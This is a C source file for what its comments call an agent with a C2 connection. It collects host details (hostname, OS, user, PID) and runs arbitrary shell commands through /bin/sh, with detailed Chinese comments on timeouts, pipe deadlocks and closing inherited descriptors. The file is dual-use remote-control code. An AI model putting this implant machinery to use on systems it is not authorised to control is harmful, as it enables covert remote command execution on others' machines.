#define _POSIX_C_SOURCE 200809L
#include "agent.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/utsname.h>

int agent_collect(agent_info_t *info) {
    if (!info) return -1;
    memset(info, 0, sizeof *info);
    if (gethostname(info->hostname, sizeof info->hostname) != 0)
        snprintf(info->hostname, sizeof info->hostname, "unknown");
    struct utsname u;
    if (uname(&u) == 0)
        snprintf(info->os, sizeof info->os, "%s %s", u.sysname, u.release);
    else
        snprintf(info->os, sizeof info->os, "unknown");
    const char *uenv = getenv("USER");
    if (!uenv) uenv = getenv("LOGNAME");
    if (!uenv) uenv = "unknown";
    snprintf(info->user, sizeof info->user, "%s", uenv);
    info->pid = (int)getpid();
    return 0;
}

/* ------------------------------------------------------------------
 * 子进程侧：清理继承的 fd
 *
 * 为什么必须做
 *   fork 出来的子进程继承父进程**全部** fd。被执行的命令因此持有
 *   agent 的 socket、日志管道、epoll fd…… 后果有两类，都是真的：
 *
 *   1. 对端永远等不到 EOF。父进程的某个管道读端在等 EOF，而一个已经
 *      "执行完"的子进程还攥着写端 —— 表现为"命令早就结束了，父进程
 *      却卡在读"，且没有任何报错。这就是"fork 持管道等待 EOF"。
 *   2. 被执行的命令能读写 agent 的 C2 连接。这是能力泄露，不是隐患，
 *      是已经发生的越权。
 *
 * 为什么只从 3 开始关
 *   0/1/2 保留：1 已被 dup2 到捕获管道，2 保持继承以不改动既有可观测
 *   行为（命令的 stderr 仍然落回 agent 的 stderr）。
 *
 * 为什么给上限而不是关到 RLIMIT_NOFILE
 *   RLIMIT_NOFILE 可能是 unlimited（常见值是 1073741816），无上限循环
 *   会在 fork 热路径上白白烧掉几十毫秒。4096 足够覆盖任何真实 fd 号。
 * ------------------------------------------------------------------ */
static void child_close_inherited(void)
{
    long m = sysconf(_SC_OPEN_MAX);
    if (m < 0) m = 256;
    if (m > 4096) m = 4096;
    for (int fd = 3; fd < (int)m; fd++) (void)close(fd);
}

/* 距离截止时刻还剩多少毫秒；已超时返回 0（让 poll 立刻返回并判超时） */
static int remaining_ms(const struct timespec *t0, int timeout_ms)
{
    struct timespec now;
    if (clock_gettime(CLOCK_MONOTONIC, &now) != 0) return timeout_ms;
    long long elapsed = (long long)(now.tv_sec - t0->tv_sec) * 1000
                      + (long long)((now.tv_nsec - t0->tv_nsec) / 1000000);
    long long left = (long long)timeout_ms - elapsed;
    if (left < 0) left = 0;
    return (int)left;
}

/*
 * 执行命令并捕获 stdout。
 *
 * 与旧实现的四处实质差异（每一处都对应一条真实的挂死路径）：
 *
 *   1. 超时用 poll 的毫秒精度，不用 alarm 的秒精度。
 *      旧实现 alarm((ms+999)/1000)：200ms 的超时实际上等满 1 秒；
 *      而 alarm 是**进程全局**的，会打掉调用方自己设的定时器。
 *
 *   2. 超时是"总时限"，不是每次 poll 重置。
 *      旧实现每轮 read 前重设 alarm，一个持续吐少量输出的命令
 *      （`while :; do echo x; sleep 1; done`）会让超时永远续期。
 *
 *   3. 缓冲填满后继续排空管道并丢弃。
 *      旧实现 total 到 cap-1 就 break 去 waitpid。子进程产出的字节
 *      一旦超过管道容量（64KiB）就阻塞在 write 上，父进程在 waitpid
 *      上等子进程 —— 双向等待，永久死锁。真实命令（`find /`、
 *      `cat` 大文件）很容易越过这条线。
 *
 *   4. timeout_ms <= 0 直接判参数错误。
 *      旧实现 `if (timeout_ms > 0) alarm(...)`，传 0 就是**永不超时**，
 *      命令不返回就永久卡死整个 agent。宁可拒绝执行，不接受静默挂起。
 *
 * 子进程侧另外两处：
 *   - stdin 重定向到 /dev/null：`cat`、`read` 这类命令会去读父进程的
 *     stdin，读不到 EOF 就不退出。
 *   - 关闭继承 fd：见 child_close_inherited。
 */
int agent_exec(const char *cmd, char *out, size_t cap, size_t *outlen, int timeout_ms) {
    if (!cmd || !out || cap == 0 || !outlen) return -2;
    if (timeout_ms <= 0) return -2;          /* 必须显式给正超时 */

    *outlen = 0;
    out[0] = '\0';

    int fds[2];
    if (pipe(fds) != 0) return -2;

    pid_t pid = fork();
    if (pid < 0) { close(fds[0]); close(fds[1]); return -2; }

    if (pid == 0) {
        close(fds[0]);
        if (dup2(fds[1], STDOUT_FILENO) < 0) _exit(127);
        if (fds[1] != STDOUT_FILENO) close(fds[1]);
        int dn = open("/dev/null", O_RDWR);
        if (dn >= 0) {
            dup2(dn, STDIN_FILENO);
            if (dn > STDERR_FILENO) close(dn);
        }
        child_close_inherited();
        execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
        _exit(127);
    }
    close(fds[1]);

    struct timespec t0;
    int have_clock = (clock_gettime(CLOCK_MONOTONIC, &t0) == 0);

    size_t total = 0;
    int timedout = 0;
    uint8_t sink[512];

    for (;;) {
        int wait_ms = have_clock ? remaining_ms(&t0, timeout_ms) : timeout_ms;
        struct pollfd p;
        p.fd = fds[0]; p.events = POLLIN; p.revents = 0;
        int pr = poll(&p, 1, wait_ms);
        if (pr == 0) { timedout = 1; break; }          /* 到点了 */
        if (pr < 0) { if (errno == EINTR) continue; break; }

        ssize_t n;
        if (total < cap - 1) {
            n = read(fds[0], out + total, cap - 1 - total);
            if (n > 0) { total += (size_t)n; continue; }
        } else {
            /* 缓冲已满：仍要读，只是丢弃 —— 否则子进程写满管道阻塞，
             * 父进程却在 waitpid 等它，构成死锁。 */
            n = read(fds[0], sink, sizeof sink);
            if (n > 0) continue;
        }
        if (n == 0) break;                              /* EOF */
        if (n < 0) {
            if (errno == EINTR || errno == EAGAIN) continue;
            break;
        }
    }

    if (timedout) kill(pid, SIGKILL);
    int status = 0;
    while (waitpid(pid, &status, 0) < 0) {
        if (errno != EINTR) break;
    }
    close(fds[0]);

    out[total] = '\0';
    *outlen = total;
    if (timedout) return -1;
    if (WIFEXITED(status)) return WEXITSTATUS(status);
    if (WIFSIGNALED(status)) return -3;
    return -2;
}
